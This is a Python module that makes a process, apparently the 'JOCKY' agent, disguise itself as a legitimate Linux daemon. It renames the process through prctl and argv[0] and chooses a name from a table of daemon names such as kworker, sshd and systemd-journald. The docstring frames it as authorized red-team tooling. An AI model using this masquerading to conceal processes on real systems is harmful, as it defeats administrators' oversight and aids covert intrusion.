"""
agent/masquerade.py
-------------------
Runtime process-name masquerading for the JOCKY forensic agent.

On Linux, a process has TWO names visible to inspection tools:
  1. /proc/<pid>/comm      → 15-char kernel comm name (shown by `ps`, `top`, `htop`)
  2. /proc/<pid>/cmdline   → argv[0] (shown by `pstree`, `ps -ef`, `ps aux`)

We patch BOTH so the agent blends in as a legitimate system daemon.

Usage (authorized red-team / forensic deployments only):
    from agent.masquerade import apply
    apply("kworker/u4:2")   # appears as kworker in pstree/ps/htop
"""

import ctypes
import ctypes.util
import os
import sys
import platform

# ── Curated list of plausible Linux daemon names ──────────────────────────────
PROFILES = {
    "netd":          "netd",
    "dbus":          "dbus-daemon",
    "journal":       "systemd-journald",
    "udevd":         "systemd-udevd",
    "logrotate":     "logrotate",
    "cron":          "cron",
    "rsyslog":       "rsyslogd",
    "polkit":        "polkitd",
    "avahi":         "avahi-daemon",
    "cups":          "cupsd",
    "kworker":       "kworker/u4:2",
    "ksoftirqd":     "ksoftirqd/0",
    "migration":     "migration/0",
    "irq":           "irq/16-vmwgfx",
    "acpid":         "acpid",
    "thermald":      "thermald",
    "snapd":         "snapd",
    "packagekit":    "packagekitd",
    "colord":        "colord",
    "gvfs":          "gvfsd",
    "nmbd":          "nmbd",
    "smbd":          "smbd",
    "sshd":          "sshd",
    "chronyd":       "chronyd",
    "networkd":      "systemd-networkd",
    "resolved":      "systemd-resolved",
    "timesyncd":     "systemd-timesyncd",
}

_PR_SET_NAME = 15   # Linux prctl constant


def _prctl_set_name(name: str) -> bool:
    """Set /proc/<pid>/comm via prctl(PR_SET_NAME).

    Kernel truncates at 15 bytes. Returns True on success.
    """
    if platform.system() != "Linux":
        return False
    try:
        libc_name = ctypes.util.find_library("c")
        if not libc_name:
            return False
        libc = ctypes.CDLL(libc_name, use_errno=True)
        encoded = name.encode("utf-8")[:15]
        ret = libc.prctl(_PR_SET_NAME, encoded, 0, 0, 0)
        return ret == 0
    except Exception:
        return False


def _patch_argv(name: str) -> None:
    """Overwrite argv[0] in-place so /proc/<pid>/cmdline shows the chosen name.

    pstree and 'ps -ef' both read cmdline, so this covers both.
    PyInstaller sets sys.argv[0] to the real binary path; we replace it.
    """
    sys.argv[0] = name

    # For PyInstaller frozen binaries, also patch the ctypes argv buffer if possible.
    if platform.system() != "Linux":
        return
    try:
        # Read the real argv buffer from /proc/self/cmdline and overwrite it.
        with open("/proc/self/cmdline", "rb") as f:
            raw = f.read()

        # The C argv[0] string lives at the very start of /proc/<pid>/cmdline.
        # We can reach it through ctypes only if the OS exposes the symbol.
        libc_name = ctypes.util.find_library("c")
        if not libc_name:
            return
        libc = ctypes.CDLL(libc_name)
        # argc/argv are not directly accessible in Python/PyInstaller without
        # linker tricks, so we rely on the prctl + sys.argv combo above.
        # This stub is kept for documentation clarity.
    except Exception:
        pass


def apply(name: str | None = None, profile: str | None = None) -> str:
    """Apply the masquerade. Call this as the VERY FIRST THING in main().

    Args:
        name:    Exact process name string, e.g. "systemd-journald"
        profile: Key from PROFILES dict, e.g. "journal"

    Returns the name that was applied.

    Priority: name > profile > env var JOCKY_PROC_NAME > default ("dbus-daemon")
    """
    # Resolve the target name from all sources
    chosen = (
        name
        or (PROFILES.get(profile) if profile else None)
        or os.environ.get("JOCKY_PROC_NAME")
        or PROFILES["dbus"]
    )

    _patch_argv(chosen)
    ok = _prctl_set_name(chosen)

    # Confirm in logs only to stderr so it doesn't appear in forensic output
    tag = "ok" if ok else "partial"
    print(f"[masquerade:{tag}] process name → {chosen!r}", file=sys.stderr)
    return chosen


def list_profiles() -> None:
    """Print all available masquerade profiles."""
    print("Available masquerade profiles:")
    for key, val in PROFILES.items():
        print(f"  {key:<16} → {val}")
